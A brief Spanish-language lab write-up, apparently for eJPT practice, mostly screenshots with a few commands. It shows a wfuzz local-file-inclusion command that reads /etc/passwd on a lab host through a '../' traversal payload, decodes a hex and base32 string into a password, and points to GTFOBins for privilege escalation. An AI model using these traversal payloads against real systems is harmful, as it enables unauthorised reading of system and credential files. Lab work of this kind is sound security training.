- --
- Tags: #ejptmachine #sqlinyection #lfi  #wfuzz #base32
---

![Pasted image 20250118205731](../../Fotos/Pasted%20image%2020250118205731.png)

De momento no encontramos solo un /wordpress/index.php intentaremos con un LFI con wfuzz
`wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.18.0.2/wordpress/index.php?FUZZ=../../../../../etc/passwd --hl 40`
![Pasted image 20250118210928](../../Fotos/Pasted%20image%2020250118210928.png)
- La palabra es love

![Pasted image 20250118211040](../../Fotos/Pasted%20image%2020250118211040.png)

![Pasted image 20250118211147](../../Fotos/Pasted%20image%2020250118211147.png)
- Existen 2 usuarios además de root

![Pasted image 20250118212641](../../Fotos/Pasted%20image%2020250118212641.png)

![Pasted image 20250118214254](../../Fotos/Pasted%20image%2020250118214254.png)

![Pasted image 20250118214411](../../Fotos/Pasted%20image%2020250118214411.png)

`echo "4E 5A 58 57 43 59 33 46 4F 4A 32 47 43 34 54 42 4F 4E 58 58 47 32 49 4B" | xxd -r -p`
`echo "NZXWCY3FOJ2GC4TBONXXG2IK" | base32 -d`
- noacertarasosi

![Pasted image 20250118215015](../../Fotos/Pasted%20image%2020250118215015.png)

GTFOBins
![Pasted image 20250118215043](../../Fotos/Pasted%20image%2020250118215043.png)